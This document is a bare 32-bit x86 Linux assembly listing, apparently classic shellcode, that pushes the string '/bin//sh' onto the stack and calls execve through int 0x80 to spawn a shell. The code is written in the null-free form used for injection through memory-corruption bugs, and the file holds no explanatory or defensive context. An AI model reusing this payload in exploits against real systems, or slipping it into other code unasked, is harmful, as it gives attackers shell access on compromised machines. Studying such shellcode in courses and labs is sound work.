.globl main

main:
  xorl	%edx, %edx

  pushl	%edx
  pushl	$0x68732f2f
  pushl $0x6e69622f

  movl	%esp, %ebx

  pushl	%edx
  pushl	%ebx

  movl	%esp, %ecx

  leal	11(%edx), %eax
  int	$0x80
